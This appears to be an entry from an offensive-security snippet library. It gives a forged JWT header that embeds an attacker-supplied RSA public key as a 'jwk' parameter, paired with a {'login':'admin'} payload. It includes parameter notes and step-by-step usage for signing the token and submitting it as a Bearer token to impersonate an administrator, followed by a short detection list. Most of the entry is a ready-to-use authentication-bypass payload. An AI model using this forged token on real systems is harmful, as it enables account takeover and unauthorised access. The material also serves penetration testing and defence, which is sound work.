---
type: code
language: json
verified: true
tags:
  - jwt
  - header
  - jwk
  - injection
platforms:
  - Web Applications
validated: true
---

# jwt-header-with-injected-jwk-payload

## Code

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "jwt_tool",
    "use": "sig",
    "e": "AQAB",
    "n": "uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw"
  }
}.
{"login":"admin"}.
[Signed with new Private key; Public key injected]
```

## Description

This JSON structure represents a manually crafted JWT for key injection: the header includes an injected RSA public key as JWK, followed by a modified admin payload and placeholder signature. Base64url-encode each part (header, payload) and append the signature to form the full token.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| n | RSA public modulus (from your key pair) | uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw |
| login | Payload claim to impersonate | admin |

## Usage

Use this in manual JWT forging when automated tools are unavailable. Generate your own RSA key pair with openssl, insert the public 'n' and 'e' into the header, base64url-encode, sign the header.payload with your private key (e.g., via pyjwt or jwt_tool), and submit as Bearer token in API requests.

## Detection

- Log and alert on JWT headers containing 'jwk' parameters from untrusted sources.
- Validate that public keys match a whitelist of known moduli.
- Monitor for tokens with unexpected 'kid' values or algorithm mismatches.
- Use JWT libraries with built-in protections against key confusion (e.g., nimbus-jose-jwt).

## Related

- [[procedures/JWT-Signature-Key-Injection-Attack]]
- [[tools/jwt-tool]]
